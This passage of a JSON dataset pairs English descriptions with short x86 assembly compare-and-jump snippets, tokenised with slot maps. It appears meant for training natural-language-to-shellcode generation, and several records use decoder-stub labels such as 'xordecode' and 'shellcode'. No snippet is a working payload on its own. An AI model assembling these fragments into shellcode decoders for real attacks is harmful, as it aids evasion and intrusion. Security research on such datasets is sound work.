      "9",
      "then",
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "9",
      "\\n",
      "jg",
      "var0"
    ]
  },
  {
    "intent": "jump to the label l1 if the contents of the al register is greater than or equal to the decimal value 9",
    "rewritten_intent": "jump to the label l1 if the contents of the al register is greater than or equal to the decimal value 9",
    "snippet": "cmp al, 9 \\n jge l1",
    "slot_map": {
      "l1": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "al",
      "register",
      "greater",
      "or",
      "equal",
      "decimal",
      "value",
      "9"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "9",
      "\\n",
      "jge",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the al register is greater than or equal to the decimal value 9 then jump to the label l1",
    "rewritten_intent": "if the contents of the al register is greater than or equal to the decimal value 9 then jump to the label l1",
    "snippet": "cmp al, 9 \\n jge l1",
    "slot_map": {
      "l1": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "al",
      "register",
      "greater",
      "or",
      "equal",
      "decimal",
      "value",
      "9",
      "then",
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "9",
      "\\n",
      "jge",
      "var0"
    ]
  },
  {
    "intent": "jump to the l2 label if the unsigned contents of the al register is greater than the unsigned contents of the bl register else add the value 3 to the eax register",
    "rewritten_intent": "jump to the l2 label if the unsigned contents of the al register is greater than the unsigned contents of the bl register else add the value 3 to the eax register",
    "snippet": "cmp al, bl \\n ja l2 \\n add eax, 3",
    "slot_map": {
      "l2": "var0",
      "bl": "var1",
      "eax": "var2"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "unsigned",
      "contents",
      "al",
      "register",
      "greater",
      "unsigned",
      "contents",
      "var1",
      "register",
      "else",
      "add",
      "value",
      "3",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var1",
      "\\n",
      "ja",
      "var0",
      "\\n",
      "add",
      "var2",
      ",",
      "3"
    ]
  },
  {
    "intent": "if the unsigned contents of the al register is greater than the unsigned contents of the bl register then jump to the l2 label else add the value 3 to the eax register",
    "rewritten_intent": "if the unsigned contents of the al register is greater than the unsigned contents of the bl register then jump to the l2 label else add the value 3 to the eax register",
    "snippet": "cmp al, bl \\n ja l2 \\n add eax, 3",
    "slot_map": {
      "bl": "var0",
      "l2": "var1",
      "eax": "var2"
    },
    "intent_tokens": [
      "if",
      "unsigned",
      "contents",
      "al",
      "register",
      "greater",
      "unsigned",
      "contents",
      "var0",
      "register",
      "then",
      "jump",
      "var1",
      "label",
      "else",
      "add",
      "value",
      "3",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var0",
      "\\n",
      "ja",
      "var1",
      "\\n",
      "add",
      "var2",
      ",",
      "3"
    ]
  },
  {
    "intent": "jump to the label l2 if the unsigned contents of the al register is lower than the unsigned contents of the bl register",
    "rewritten_intent": "jump to the label l2 if the unsigned contents of the al register is lower than the unsigned contents of the bl register",
    "snippet": "cmp al, bl \\n jb l2",
    "slot_map": {
      "l2": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "unsigned",
      "contents",
      "al",
      "register",
      "lower",
      "unsigned",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var1",
      "\\n",
      "jb",
      "var0"
    ]
  },
  {
    "intent": "if the unsigned contents of the al register is lower than the unsigned contents of the bl register then jump to the label l2",
    "rewritten_intent": "if the unsigned contents of the al register is lower than the unsigned contents of the bl register then jump to the label l2",
    "snippet": "cmp al, bl \\n jb l2",
    "slot_map": {
      "bl": "var0",
      "l2": "var1"
    },
    "intent_tokens": [
      "if",
      "unsigned",
      "contents",
      "al",
      "register",
      "lower",
      "unsigned",
      "contents",
      "var0",
      "register",
      "then",
      "jump",
      "label",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var0",
      "\\n",
      "jb",
      "var1"
    ]
  },
  {
    "intent": "compare the contents of al with the cl register",
    "rewritten_intent": "compare the contents of al with the cl register",
    "snippet": "cmp al, cl",
    "slot_map": {},
    "intent_tokens": [
      "compare",
      "contents",
      "al",
      "cl",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "cl"
    ]
  },
  {
    "intent": "compare the contents of the al register and the contents of the cl register",
    "rewritten_intent": "compare the contents of the al register and the contents of the cl register",
    "snippet": "cmp al, cl",
    "slot_map": {},
    "intent_tokens": [
      "compare",
      "contents",
      "al",
      "register",
      "and",
      "contents",
      "cl",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "cl"
    ]
  },
  {
    "intent": "jump short to the decode label if the contents of the al register is not equal to the contents of the cl register else jump to the shellcode label",
    "rewritten_intent": "jump short to the decode label if the contents of the al register is not equal to the contents of the cl register else jump to the shellcode label",
    "snippet": "cmp al, cl \\n jne short decode \\n jmp shellcode",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "decode",
      "label",
      "if",
      "contents",
      "al",
      "register",
      "not",
      "equal",
      "contents",
      "cl",
      "register",
      "else",
      "jump",
      "shellcode",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "cl",
      "\\n",
      "jne",
      "short",
      "decode",
      "\\n",
      "jmp",
      "shellcode"
    ]
  },
  {
    "intent": "if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label",
    "rewritten_intent": "if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label",
    "snippet": "cmp ax, bx \\n jne l3",
    "slot_map": {
      "bx": "var0",
      "l3": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "ax",
      "register",
      "not",
      "equal",
      "contents",
      "var0",
      "register",
      "then",
      "jump",
      "var1",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "ax",
      ",",
      "var0",
      "\\n",
      "jne",
      "var1"
    ]
  },
  {
    "intent": "if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label else jump to the while label",
    "rewritten_intent": "if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label else jump to the while label",
    "snippet": "cmp ax, bx \\n jne l3 \\n jmp while",
    "slot_map": {
      "bx": "var0",
      "l3": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "ax",
      "register",
      "not",
      "equal",
      "contents",
      "var0",
      "register",
      "then",
      "jump",
      "var1",
      "label",
      "else",
      "jump",
      "while",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "ax",
      ",",
      "var0",
      "\\n",
      "jne",
      "var1",
      "\\n",
      "jmp",
      "while"
    ]
  },
  {
    "intent": "jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register else jump to the while label",
    "rewritten_intent": "jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register else jump to the while label",
    "snippet": "cmp ax, bx \\n jne l3 \\n jmp while",
    "slot_map": {
      "l3": "var0",
      "bx": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "ax",
      "register",
      "not",
      "equal",
      "contents",
      "var1",
      "register",
      "else",
      "jump",
      "while",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "ax",
      ",",
      "var1",
      "\\n",
      "jne",
      "var0",
      "\\n",
      "jmp",
      "while"
    ]
  },
  {
    "intent": "compare the contents of bh and the contents of al",
    "rewritten_intent": "compare the contents of bh and the contents of al",
    "snippet": "cmp bh, al",
    "slot_map": {},
    "intent_tokens": [
      "compare",
      "contents",
      "bh",
      "and",
      "contents",
      "al"
    ],
    "snippet_tokens": [
      "cmp",
      "bh",
      ",",
      "al"
    ]
  },
  {
    "intent": "compare the contents of bl and 0x1f",
    "rewritten_intent": "compare the contents of bl and 0x1f",
    "snippet": "cmp bl, 0x1f",
    "slot_map": {
      "0x1f": "var1",
      "bl": "var0"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "jump to the memory address 0xf3 if the unsigned contents of the bl register is lower than the unsigned value 0x1f else add the 0x40 value to the al register",
    "rewritten_intent": "jump to the memory address 0xf3 if the unsigned contents of the bl register is lower than the unsigned value 0x1f else add the 0x40 value to the al register",
    "snippet": "cmp bl, 0x1f \\n jb 0xf3 \\n add al, 0x40",
    "slot_map": {
      "bl": "var0",
      "0x1f": "var1",
      "0x40": "var2"
    },
    "intent_tokens": [
      "jump",
      "memory",
      "address",
      "0xf3",
      "if",
      "unsigned",
      "contents",
      "var0",
      "register",
      "lower",
      "unsigned",
      "value",
      "var1",
      "else",
      "add",
      "var2",
      "value",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "jb",
      "0xf3",
      "\\n",
      "add",
      "al",
      ",",
      "var2"
    ]
  },
  {
    "intent": "if the unsigned contents of the bl register is lower than the unsigned value 0x1f then jump to the memory address 0xf3 else add the 0x40 value to the al register",
    "rewritten_intent": "if the unsigned contents of the bl register is lower than the unsigned value 0x1f then jump to the memory address 0xf3 else add the 0x40 value to the al register",
    "snippet": "cmp bl, 0x1f \\n jb 0xf3 \\n add al, 0x40",
    "slot_map": {
      "bl": "var0",
      "0x1f": "var1",
      "0x40": "var2"
    },
    "intent_tokens": [
      "if",
      "unsigned",
      "contents",
      "var0",
      "register",
      "lower",
      "unsigned",
      "value",
      "var1",
      "then",
      "jump",
      "memory",
      "address",
      "0xf3",
      "else",
      "add",
      "var2",
      "value",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "jb",
      "0xf3",
      "\\n",
      "add",
      "al",
      ",",
      "var2"
    ]
  },
  {
    "intent": "jump to the shellcode label if the contents of the bl register is equal to the value 0xaa",
    "rewritten_intent": "jump to the shellcode label if the contents of the bl register is equal to the value 0xaa",
    "snippet": "cmp bl, 0xaa \\n je shellcode",
    "slot_map": {
      "0xaa": "var1",
      "bl": "var0"
    },
    "intent_tokens": [
      "jump",
      "shellcode",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "value",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "shellcode"
    ]
  },
  {
    "intent": "jump to the xordecode label if the contents of the bl register is equal to the value 0xbb else jump to the notdecode label",
    "rewritten_intent": "jump to the xordecode label if the contents of the bl register is equal to the value 0xbb else jump to the notdecode label",
    "snippet": "cmp bl, 0xbb \\n je xordecode \\n jmp notdecode",
    "slot_map": {
      "0xbb": "var2",
      "xordecode": "var0",
      "bl": "var1",
      "notdecode": "var3"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "var1",
      "register",
      "equal",
      "value",
      "var2",
      "else",
      "jump",
      "var3",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "var2",
      "\\n",
      "je",
      "var0",
      "\\n",
      "jmp",
      "var3"
    ]
  },
  {
    "intent": "compare ebx register's lower half value against ascii value 48",
    "rewritten_intent": "compare ebx register's lower half value against ascii value 48",
    "snippet": "cmp bl, 48",
    "slot_map": {
      "ebx": "var0",
      "'s": "var1",
      "against": "var2"
    },
    "intent_tokens": [
      "compare",
      "var0",
      "register",
      "'s",
      "lower",
      "half",
      "value",
      "var2",
      "ascii",
      "value",
      "48"
    ],
    "snippet_tokens": [
      "cmp",
      "bl",
      ",",
      "48"
    ]
  },
  {
    "intent": "compare ebx register's lower half value against ascii value 57",
    "rewritten_intent": "compare ebx register's lower half value against ascii value 57",
    "snippet": "cmp bl, 57",
    "slot_map": {
      "ebx": "var0",
      "'s": "var1",
      "against": "var2"
    },
    "intent_tokens": [
      "compare",
      "var0",
      "register",
      "'s",
      "lower",
      "half",
      "value",
      "var2",
      "ascii",
      "value",
      "57"
    ],
    "snippet_tokens": [
      "cmp",
      "bl",
      ",",
      "57"
    ]
  },
  {
    "intent": "jump to the memory location loc_402B1D if the contents of the bl register is greater than the value 78h",
    "rewritten_intent": "jump to the memory location loc_402B1D if the contents of the bl register is greater than the value 78h",
    "snippet": "cmp bl, 78h \\n jg short loc_402B1D",
    "slot_map": {
      "loc_402B1D": "var0",
      "bl": "var1",
      "78h": "var2"
    },
    "intent_tokens": [
      "jump",
      "memory",
      "location",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "greater",
      "value",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "var2",
      "\\n",
      "jg",
      "short",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the bl register is greater than the value 78h then jump to the memory location loc_402B1D",
    "rewritten_intent": "if the contents of the bl register is greater than the value 78h then jump to the memory location loc_402B1D",
    "snippet": "cmp bl, 78h \\n jg short loc_402B1D",
    "slot_map": {
      "loc_402B1D": "var2",
      "bl": "var0",
      "78h": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "greater",
      "value",
      "var1",
      "then",
      "jump",
      "memory",
      "location",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "jg",
      "short",
      "var2"
    ]
  },
  {
    "intent": "jump to the memory location loc_402B1D if the contents of the bl register is greater than or equal to the value 78h",
    "rewritten_intent": "jump to the memory location loc_402B1D if the contents of the bl register is greater than or equal to the value 78h",
    "snippet": "cmp bl, 78h \\n jge short loc_402B1D",
    "slot_map": {
      "loc_402B1D": "var0",
      "bl": "var1",
      "78h": "var2"
    },
    "intent_tokens": [
      "jump",
      "memory",
      "location",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "greater",
      "or",
      "equal",
      "value",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "var2",
      "\\n",
      "jge",
      "short",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the bl register is greater than or equal to the value 78h then jump to the memory location loc_402B1D",
    "rewritten_intent": "if the contents of the bl register is greater than or equal to the value 78h then jump to the memory location loc_402B1D",
    "snippet": "cmp bl, 78h \\n jge short loc_402B1D",
    "slot_map": {
      "loc_402B1D": "var2",
      "bl": "var0",
      "78h": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "greater",
      "or",
      "equal",
      "value",
      "var1",
      "then",
      "jump",
      "memory",
      "location",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "jge",
      "short",
      "var2"
    ]
  },
  {
    "intent": "jump to the memory location loc_402B1D if the contents of the bl register is less than the value 78h",
    "rewritten_intent": "jump to the memory location loc_402B1D if the contents of the bl register is less than the value 78h",
    "snippet": "cmp bl, 78h \\n jl short loc_402B1D",
    "slot_map": {
      "loc_402B1D": "var0",
      "bl": "var1",
      "78h": "var2"
    },
    "intent_tokens": [
      "jump",
      "memory",
      "location",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "less",
      "value",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "var2",
      "\\n",
      "jl",
      "short",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the bl register is less than the value 78h then jump to the memory location loc_402B1D",
    "rewritten_intent": "if the contents of the bl register is less than the value 78h then jump to the memory location loc_402B1D",
    "snippet": "cmp bl, 78h \\n jl short loc_402B1D",
    "slot_map": {
      "loc_402B1D": "var2",
      "bl": "var0",
      "78h": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "less",
      "value",
      "var1",
      "then",
      "jump",
      "memory",
      "location",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "jl",
      "short",
      "var2"
    ]
  },
  {
    "intent": "jump to the memory location loc_402B1D if the contents of the bl register is less than or equal to the value 78h",
    "rewritten_intent": "jump to the memory location loc_402B1D if the contents of the bl register is less than or equal to the value 78h",
    "snippet": "cmp bl, 78h \\n jle short loc_402B1D",
    "slot_map": {
      "loc_402B1D": "var0",
      "bl": "var1",
      "78h": "var2"
    },
    "intent_tokens": [
      "jump",
      "memory",
      "location",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "less",
      "or",
      "equal",
      "value",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "var2",
      "\\n",
      "jle",
      "short",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the bl register is less than or equal to the value 78h then jump to the memory location loc_402B1D",
    "rewritten_intent": "if the contents of the bl register is less than or equal to the value 78h then jump to the memory location loc_402B1D",
    "snippet": "cmp bl, 78h \\n jle short loc_402B1D",
    "slot_map": {
      "loc_402B1D": "var2",
      "bl": "var0",
      "78h": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "less",
      "or",
      "equal",
      "value",
      "var1",
      "then",
      "jump",
      "memory",
      "location",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "jle",
      "short",
      "var2"
    ]
  },
  {
    "intent": "jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register",
    "rewritten_intent": "jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register",
    "snippet": "cmp bl, al \\n je loop_2",
    "slot_map": {
      "loop_2": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "var1",
      "register",
      "equal",
      "contents",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "al",
      "\\n",
      "je",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label",
    "rewritten_intent": "if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label",
    "snippet": "cmp bl, al \\n je loop_2",
    "slot_map": {
      "loop_2": "var1",
      "bl": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "al",
      "register",
      "then",
      "jump",
      "var1",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "al",
      "\\n",
      "je",
      "var1"
    ]
  },
  {
    "intent": "jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register else jump short to the not_found label",
    "rewritten_intent": "jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register else jump short to the not_found label",
    "snippet": "cmp bl, al \\n je loop_2 \\n jmp short not_found",
    "slot_map": {
      "loop_2": "var0",
      "not_found": "var2",
      "bl": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "var1",
      "register",
      "equal",
      "contents",
      "al",
      "register",
      "else",
      "jump",
      "short",
      "var2",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "al",
      "\\n",
      "je",
      "var0",
      "\\n",
      "jmp",
      "short",
      "var2"
    ]
  },
  {
    "intent": "if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label else jump short to the not_found label",
    "rewritten_intent": "if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label else jump short to the not_found label",
    "snippet": "cmp bl, al \\n je loop_2 \\n jmp short not_found",
    "slot_map": {
      "loop_2": "var1",
      "not_found": "var2",
      "bl": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "al",
      "register",
      "then",
      "jump",
      "var1",
      "label",
      "else",
      "jump",
      "short",
      "var2",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "al",
      "\\n",
      "je",
      "var1",
      "\\n",
      "jmp",
      "short",
      "var2"
    ]
  },
  {
    "intent": "compare the byte at the memory location buff with 61h",
    "rewritten_intent": "compare the byte at the memory location buff with 61h",
    "snippet": "cmp byte [buff], 61h",
    "slot_map": {},
    "intent_tokens": [
      "compare",
      "byte",
      "memory",
      "location",
      "buff",
      "61h"
    ],
    "snippet_tokens": [
      "cmp",
      "byte",
      "[",
      "buff",
      "]",
      ",",
      "61h"
    ]
  },
  {
    "intent": "compare the byte at the memory location buff with 7ah",
    "rewritten_intent": "compare the byte at the memory location buff with 7ah",
    "snippet": "cmp byte [buff], 7ah",
    "slot_map": {
      "7ah": "var0"
    },
    "intent_tokens": [
      "compare",
      "byte",
      "memory",
      "location",
      "buff",
      "var0"
    ],
    "snippet_tokens": [
      "cmp",
      "byte",
      "[",
      "buff",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "compare the byte pointed to by eax at this address against zero",
    "rewritten_intent": "compare the byte pointed to by eax at this address against zero",
    "snippet": "cmp byte [eax], 0",
    "slot_map": {
      "eax": "var0",
      "this": "var1",
      "against": "var2"
    },
    "intent_tokens": [
      "compare",
      "byte",
      "pointed",
      "var0",
      "var1",
      "address",
      "var2",
      "zero"
    ],
    "snippet_tokens": [
      "cmp",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "0"
    ]
  },
  {
    "intent": "compare the byte at the memory location ebp+ecx with 61h",
    "rewritten_intent": "compare the byte at the memory location ebp+ecx with 61h",
    "snippet": "cmp byte [ebp+ecx], 61h",
    "slot_map": {
      "ebp+ecx": "var0"
    },
    "intent_tokens": [
      "compare",
      "byte",
      "memory",
      "location",
      "var0",
      "61h"
    ],
    "snippet_tokens": [
      "cmp",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "61h"
    ]
  },
  {
    "intent": "compare the byte at the memory location ebp+ecx with 7ah",
    "rewritten_intent": "compare the byte at the memory location ebp+ecx with 7ah",
    "snippet": "cmp byte [ebp+ecx], 7ah",
    "slot_map": {
      "ebp+ecx": "var0",
      "7ah": "var1"
    },
    "intent_tokens": [
      "compare",
      "byte",
      "memory",
      "location",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "var1"
    ]
  },
  {
    "intent": "jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e",
    "rewritten_intent": "jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e",
    "snippet": "cmp BYTE [edx], 0x2e \\n jne l2",
    "slot_map": {
      "0x2e": "var2",
      "l2": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "byte",
      "starting",
      "address",
      "contained",
      "var1",
      "register",
      "not",
      "equal",
      "byte",
      "value",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "BYTE",
      "[",
      "var1",
      "]",
      ",",
      "var2",
      "\\n",
      "jne",
      "var0"
    ]
  },
  {
    "intent": "if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label",
    "rewritten_intent": "if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label",
    "snippet": "cmp BYTE [edx], 0x2e \\n jne l2",
    "slot_map": {
      "0x2e": "var1",
      "edx": "var0",
      "l2": "var2"
    },
    "intent_tokens": [
      "if",
      "byte",
      "starting",
      "address",
      "contained",
      "var0",
      "register",
      "not",
      "equal",
      "byte",
      "value",
      "var1",
      "then",
      "jump",
      "var2",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "BYTE",
      "[",
      "var0",
      "]",
      ",",
      "var1",
      "\\n",
      "jne",
      "var2"
    ]
  },
  {
    "intent": "jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e else jump to the while label",
    "rewritten_intent": "jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e else jump to the while label",
    "snippet": "cmp BYTE [edx], 0x2e \\n jne l2 \\n jmp while",
    "slot_map": {
      "0x2e": "var2",
      "l2": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "byte",
      "starting",
      "address",
      "contained",
      "var1",
      "register",
      "not",
      "equal",
      "byte",
      "value",
      "var2",
      "else",
      "jump",
      "while",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "BYTE",
      "[",
      "var1",
      "]",
      ",",
      "var2",
      "\\n",
      "jne",
      "var0",
      "\\n",
      "jmp",
      "while"
    ]
  },
  {
    "intent": "if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label else jump to the while label",
    "rewritten_intent": "if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label else jump to the while label",
    "snippet": "cmp BYTE [edx], 0x2e \\n jne l2 \\n jmp while",
    "slot_map": {
      "0x2e": "var1",
      "edx": "var0",
      "l2": "var2"
    },
    "intent_tokens": [
      "if",
      "byte",
      "starting",
      "address",
      "contained",
      "var0",
      "register",
      "not",
      "equal",
      "byte",
      "value",
      "var1",
      "then",
      "jump",
      "var2",
      "label",
      "else",
      "jump",
      "while",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "BYTE",
      "[",
      "var0",
      "]",
      ",",
      "var1",
      "\\n",
      "jne",
      "var2",
      "\\n",
      "jmp",
      "while"
    ]
  },
  {
    "intent": "compare the byte in esi with 0x7",
    "rewritten_intent": "compare the byte in esi with 0x7",
    "snippet": "cmp byte [esi], 0x7",
    "slot_map": {
      "0x7": "var1",
      "esi": "var0"
    },
    "intent_tokens": [
      "compare",
      "byte",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "var1"
    ]
  },
  {
    "intent": "jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7",
    "rewritten_intent": "jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7",
    "snippet": "cmp BYTE [esi], 0x7 \\n jl lowbound",
    "slot_map": {
      "0x7": "var2",
      "lowbound": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "byte",
      "starting",
      "address",
      "contained",
      "var1",
      "register",
      "lower",
      "byte",
      "value",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "BYTE",
      "[",
      "var1",
      "]",
      ",",
      "var2",
      "\\n",
      "jl",
      "var0"
    ]
  },
  {
    "intent": "if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label",
    "rewritten_intent": "if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label",
    "snippet": "cmp BYTE [esi], 0x7 \\n jl lowbound",
    "slot_map": {
      "0x7": "var1",
      "esi": "var0",
      "lowbound": "var2"
    },
    "intent_tokens": [
      "if",
      "byte",
      "starting",
      "address",
      "contained",
      "var0",
      "register",
      "lower",
      "byte",
      "value",
      "var1",
      "then",
      "jump",
      "var2",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "BYTE",
      "[",
      "var0",
      "]",
      ",",
      "var1",
      "\\n",
      "jl",
      "var2"
    ]
  },
  {
    "intent": "if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label else subtract the byte value 0x7 from byte starting at the address contained in the esi register",
    "rewritten_intent": "if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label else subtract the byte value 0x7 from byte starting at the address contained in the esi register",
    "snippet": "cmp BYTE [esi], 0x7 \\n jl lowbound \\n sub BYTE [esi], 0x7",
    "slot_map": {
      "0x7": "var2",
      "esi": "var0",
      "lowbound": "var3"
    },
    "intent_tokens": [
      "if",
      "byte",
      "starting",
      "address",
      "contained",
      "var0",
      "register",
      "lower",
      "byte",
      "value",
      "var2",
      "then",
      "jump",
      "var3",
      "label",
      "else",
      "subtract",
      "byte",
      "value",
      "var2",
      "byte",
      "starting",
      "address",
      "contained",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "BYTE",
      "[",
      "var0",
      "]",
      ",",
      "var2",
      "\\n",
      "jl",
      "var3",
      "\\n",
      "sub",
      "BYTE",
      "[",
      "var0",
      "]",
      ",",
      "var2"
    ]
  },
  {
    "intent": "jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7 else subtract the byte value 0x7 from byte starting at the address contained in the esi register",
    "rewritten_intent": "jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7 else subtract the byte value 0x7 from byte starting at the address contained in the esi register",
    "snippet": "cmp BYTE [esi], 0x7 \\n jl lowbound \\n sub BYTE [esi], 0x7",
    "slot_map": {
      "0x7": "var3",
      "lowbound": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "byte",
      "starting",
      "address",
      "contained",
      "var1",
      "register",
      "lower",
      "byte",
      "value",
      "var3",
      "else",
      "subtract",
      "byte",
      "value",
      "var3",
      "byte",
      "starting",
      "address",
      "contained",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "BYTE",
      "[",
      "var1",
      "]",
      ",",
      "var3",
      "\\n",
      "jl",
      "var0",
      "\\n",
      "sub",
      "BYTE",
      "[",
      "var1",
      "]",
      ",",
      "var3"
    ]
  },
  {
    "intent": "jump to the lowbound label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7",
    "rewritten_intent": "jump to the lowbound label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7",
    "snippet": "cmp BYTE [esi], 0x7 \\n jle lowbound",
    "slot_map": {
      "0x7": "var2",
      "lowbound": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "byte",
      "starting",
      "address",
      "contained",
      "var1",
      "register",
      "lower",
      "or",
      "equal",
      "byte",
      "value",
      "var2"
    ],
    "snippet_tokens": [
